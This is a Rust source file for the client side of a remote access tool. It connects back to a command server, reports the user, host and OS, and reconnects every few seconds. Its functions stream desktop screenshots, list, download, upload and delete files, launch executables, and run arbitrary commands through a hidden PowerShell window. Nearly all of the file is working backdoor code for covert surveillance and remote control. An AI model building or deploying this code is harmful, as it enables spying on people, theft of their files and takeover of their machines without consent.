use tokio::net::TcpStream;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::time::{Duration, sleep};
use std::error::Error;
use uuid::Uuid;
use sysinfo::{System, SystemExt};
use std::process::Command;
use std::fs;
use base64::{encode, decode};
use serde_json::json;
use scrap::{Capturer, Display};
use image::{ImageBuffer, Rgb};
use std::io::{Cursor, ErrorKind};
use std::sync::Arc;
use tokio::sync::mpsc;
use tokio::task;
use std::sync::mpsc as std_mpsc;
use std::sync::atomic::{AtomicBool, Ordering};
use hostname;

const DELIMITER: u8 = b'\0';
const RECONNECT_DELAY: u64 = 5;
const DESKTOP_CAPTURE_COMMAND_START: &str = "START_DESKTOP_CAPTURE";
const DESKTOP_CAPTURE_COMMAND_STOP: &str = "STOP_DESKTOP_CAPTURE";
const DESKTOP_CAPTURE_PREFIX: &str = "DESKTOP_CAPTURE";

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let server_addr = "127.0.0.1:7880";
    let client_id = Arc::new(Uuid::new_v4().to_string());
    let system = System::new_all();
    let os_name = system.name().unwrap_or_else(|| "Unknown".to_string());
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string());
    let hostname = hostname::get()?.to_string_lossy().to_string();

    let info = format!(
        "INFO:{}|{}|{}|{}",
        username,
        hostname,
        *client_id,
        os_name
    );

    loop {
        match TcpStream::connect(server_addr).await {
            Ok(stream) => {
                println!("Connected to server at {}", server_addr);
                let (reader, writer) = stream.into_split();
                let writer = Arc::new(tokio::sync::Mutex::new(writer));
                let mut reader = BufReader::new(reader);
                {
                    let mut w = writer.lock().await;
                    w.write_all(info.as_bytes()).await?;
                    w.write_u8(DELIMITER).await?;
                    w.flush().await?;
                }
                println!("Sent client info to server.");
                let (image_tx, mut image_rx) = mpsc::channel::<String>(100);
                let is_capturing = Arc::new(AtomicBool::new(false));
                let writer_clone = Arc::clone(&writer);
                let client_id_clone = Arc::clone(&client_id);
                let image_writer = task::spawn(async move {
                    while let Some(image) = image_rx.recv().await {
                        let message = format!("{}:{}:{}", DESKTOP_CAPTURE_PREFIX, *client_id_clone, image);
                        let mut w = writer_clone.lock().await;
                        if let Err(e) = w.write_all(message.as_bytes()).await {
                            eprintln!("Error sending desktop capture to server: {}", e);
                            break;
                        }
                        if let Err(e) = w.write_u8(DELIMITER).await {
                            eprintln!("Error sending delimiter to server: {}", e);
                            break;
                        }
                        if let Err(e) = w.flush().await {
                            eprintln!("Error flushing writer: {}", e);
                            break;
                        }
                    }
                });
                let writer_clone = Arc::clone(&writer);
                let client_id_clone = Arc::clone(&client_id);
                let image_tx_clone = image_tx.clone();
                let is_capturing_clone = Arc::clone(&is_capturing);

                let handle_messages = task::spawn(async move {
                    let mut buffer = Vec::new();
                    let mut capture_handle: Option<task::JoinHandle<Result<(), Box<dyn Error + Send + Sync>>>> = None;
                    let mut stop_sender: Option<std_mpsc::Sender<()>> = None;

                    while match reader.read_until(DELIMITER, &mut buffer).await {
                        Ok(bytes_read) => {
                            if bytes_read == 0 {
                                println!("Server closed the connection.");
                                false
                            } else {
                                if let Ok(message) = String::from_utf8(buffer[..buffer.len() - 1].to_vec()) {
                                    println!("Received message: {}", message);
                                    if message == DESKTOP_CAPTURE_COMMAND_START {
                                        println!("Received START_DESKTOP_CAPTURE command.");
                                        if !is_capturing_clone.load(Ordering::SeqCst) {
                                            is_capturing_clone.store(true, Ordering::SeqCst);
                                            let is_capturing_clone2 = Arc::clone(&is_capturing_clone);
                                            let image_tx_clone2 = image_tx_clone.clone();
                                            let client_id_clone2 = Arc::clone(&client_id_clone);
                                            let (new_stop_tx, new_stop_rx) = std_mpsc::channel();
                                            stop_sender = Some(new_stop_tx);
                                            capture_handle = Some(task::spawn_blocking(move || {
                                                desktop_capture_task(&image_tx_clone2, &client_id_clone2, new_stop_rx, &is_capturing_clone2)
                                            }));
                                        }
                                    } else if message == DESKTOP_CAPTURE_COMMAND_STOP {
                                        println!("Received STOP_DESKTOP_CAPTURE command.");
                                        is_capturing_clone.store(false, Ordering::SeqCst);
                                        if let Some(sender) = stop_sender.take() {
                                            let _ = sender.send(());
                                        }
                                        if let Some(handle) = capture_handle.take() {
                                            let _ = handle.await;
                                        }
                                    } else {
                                        // Handle other commands
                                        let output = execute_command(&message);
                                        let response = format!("{}:{}", *client_id_clone, output);
                                        let mut w = writer_clone.lock().await;
                                        if let Err(e) = w.write_all(response.as_bytes()).await {
                                            eprintln!("Error sending response to server: {}", e);
                                        }
                                        if let Err(e) = w.write_u8(DELIMITER).await {
                                            eprintln!("Error sending delimiter to server: {}", e);
                                        }
                                        if let Err(e) = w.flush().await {
                                            eprintln!("Error flushing writer: {}", e);
                                        }
                                    }
                                } else {
                                    eprintln!("Received invalid UTF-8 message.");
                                }
                                buffer.clear();
                                true
                            }
                        }
                        Err(e) => {
                            eprintln!("Error reading from server: {}", e);
                            false
                        }
                    } {}

                    // Cleanup
                    is_capturing_clone.store(false, Ordering::SeqCst);
                    if let Some(sender) = stop_sender {
                        let _ = sender.send(());
                    }
                    if let Some(handle) = capture_handle {
                        let _ = handle.await;
                    }
                });
                handle_messages.await?;
                image_writer.await?;
                println!("Connection closed. Attempting to reconnect in {} seconds...", RECONNECT_DELAY);
            }
            Err(e) => {
                eprintln!("Failed to connect to server: {}. Retrying in {} seconds...", e, RECONNECT_DELAY);
            }
        }

        sleep(Duration::from_secs(RECONNECT_DELAY)).await;
    }
}
fn desktop_capture_task(
    image_tx: &mpsc::Sender<String>,
    client_id: &Arc<String>,
    stop_rx: std_mpsc::Receiver<()>,
    is_capturing: &Arc<AtomicBool>,
) -> Result<(), Box<dyn Error + Send + Sync>> {
    let capture_interval = Duration::from_millis(500);
    let display = Display::primary()?;
    let mut capturer = Capturer::new(display)?;
    let width = capturer.width();
    let height = capturer.height();
    println!("Desktop capturer initialized. Width: {}, Height: {}", width, height);

    while is_capturing.load(Ordering::SeqCst) {
        match stop_rx.try_recv() {
            Ok(_) | Err(std_mpsc::TryRecvError::Disconnected) => {
                println!("Stop signal received in capture task.");
                break;
            }
            Err(std_mpsc::TryRecvError::Empty) => {
            }
        }
        match capturer.frame() {
            Ok(frame) => {
                println!("Frame captured successfully. Size: {}", frame.len());
                let frame = frame.to_vec();
                let mut rgb_data = Vec::with_capacity(width * height * 3);
                for chunk in frame.chunks_exact(4) {
                    let b = chunk[0];
                    let g = chunk[1];
                    let r = chunk[2];
                    rgb_data.push(r);
                    rgb_data.push(g);
                    rgb_data.push(b);
                }
                let buffer: ImageBuffer<Rgb<u8>, _> =
                    ImageBuffer::from_raw(width as u32, height as u32, rgb_data)
                        .ok_or("Failed to create image buffer")?;
                let mut encoded_image = Vec::new();
                let mut cursor = Cursor::new(&mut encoded_image);
                buffer
                    .write_to(&mut cursor, image::ImageOutputFormat::Jpeg(80))
                    .map_err(|e| format!("Failed to encode image: {}", e))?;
                println!("Image encoded to JPEG. Size: {}", encoded_image.len());
                let base64_image = encode(&encoded_image);
                println!("Image encoded to base64. Size: {}", base64_image.len());
                if image_tx.blocking_send(base64_image).is_err() {
                    eprintln!("Failed to send image to async channel.");
                    break;
                }
                println!("Image sent to channel successfully.");
            }
            Err(error) => {
                if error.kind() == ErrorKind::WouldBlock {
                    println!("Frame not ready, waiting...");
                    std::thread::sleep(capture_interval);
                    continue;
                } else {
                    eprintln!("Error capturing desktop: {}", error);
                    break;
                }
            }
        }
        std::thread::sleep(capture_interval);
    }

    println!("Desktop capture task ended.");
    Ok(())
}
fn execute_command(command: &str) -> String {
    if command.starts_with("LIST_DIR:") {
        list_directory(&command[9..])
    } else if command.starts_with("DOWNLOAD:") {
        download_file(&command[9..])
    } else if command.starts_with("UPLOAD:") {
        let parts: Vec<&str> = command[7..].splitn(2, ':').collect();
        if parts.len() == 2 {
            upload_file(parts[0], parts[1])
        } else {
            "Invalid upload command format".to_string()
        }
    } else if command.starts_with("DELETE:") {
        delete_file(&command[7..])
    } else if command.starts_with("RENAME:") {
        let parts: Vec<&str> = command[7..].splitn(2, ':').collect();
        if parts.len() == 2 {
            rename_file(parts[0], parts[1])
        } else {
            "Invalid rename command format".to_string()
        }
    } else if command.starts_with("CREATE_FOLDER:") {
        create_folder(&command[14..])
    } else if command.starts_with("MOVE:") {
        let parts: Vec<&str> = command[5..].splitn(2, ':').collect();
        if parts.len() == 2 {
            move_file(parts[0], parts[1])
        } else {
            "Invalid move command format".to_string()
        }
    } else if command.starts_with("RUN:") {
        run_file(&command[4..])
    } else {
        execute_shell_command(command)
    }
}
fn list_directory(path: &str) -> String {
    match fs::read_dir(path) {
        Ok(entries) => {
            let files: Vec<_> = entries
                .filter_map(|entry| entry.ok())
                .map(|entry| {
                    let metadata = entry.metadata().unwrap();
                    let full_path = entry.path();
                    json!({
                        "Name": full_path.file_name().unwrap_or_default().to_string_lossy().to_string(),
                        "FullPath": full_path.to_string_lossy().to_string(),
                        "LastWriteTime": metadata.modified().ok().and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok()).map(|d| d.as_secs()).unwrap_or(0),
                        "Length": metadata.len(),
                        "Attributes": if metadata.is_dir() { "Directory" } else { "File" }
                    })
                })
                .collect();
            let json_string = serde_json::to_string(&files).unwrap_or_else(|e| format!("Error serializing JSON: {}", e));
            format!("FILE_LIST:{}", json_string)
        }
        Err(e) => format!("ERROR:Error listing directory: {}", e),
    }
}

fn download_file(file_path: &str) -> String {
    match fs::read(file_path) {
        Ok(content) => {
            let encoded = encode(&content);
            let file_name = std::path::Path::new(file_path).file_name().unwrap().to_string_lossy();
            format!("FILE_CONTENT:{}:{}", file_name, encoded)
        }
        Err(e) => format!("ERROR:Error reading file: {}", e),
    }
}

fn upload_file(file_path: &str, content: &str) -> String {
    match decode(content) {
        Ok(decoded) => {
            match fs::write(file_path, decoded) {
                Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File uploaded successfully"})),
                Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Error writing file: {}", e)})),
            }
        }
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Error decoding file content: {}", e)})),
    }
}

fn delete_file(path: &str) -> String {
    let result = if std::path::Path::new(path).is_dir() {
        fs::remove_dir_all(path)
    } else {
        fs::remove_file(path)
    };

    match result {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File or folder deleted successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to delete: {}", e)})),
    }
}

fn rename_file(old_path: &str, new_path: &str) -> String {
    match fs::rename(old_path, new_path) {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File or folder renamed successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to rename: {}", e)})),
    }
}

fn create_folder(path: &str) -> String {
    match fs::create_dir(path) {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "Folder created successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to create folder: {}", e)})),
    }
}

fn move_file(old_path: &str, new_path: &str) -> String {
    match fs::rename(old_path, new_path) {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File or folder moved successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to move: {}", e)})),
    }
}

fn run_file(file_path: &str) -> String {
    match Command::new(file_path).spawn() {
        Ok(_) => format!("OPERATION_RESULT:{}", json!({"success": true, "message": "File executed successfully"})),
        Err(e) => format!("OPERATION_RESULT:{}", json!({"success": false, "message": format!("Failed to execute file: {}", e)})),
    }
}

fn execute_shell_command(command: &str) -> String {
    match Command::new("powershell")
        .args(&[
            "-WindowStyle",
            "Hidden",
            "-Command",
            command,
        ])
        .output()
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            if stderr.is_empty() {
                stdout.to_string()
            } else {
                format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr)
            }
        }
        Err(e) => format!("ERROR:Failed to execute command: {}", e),
    }
}
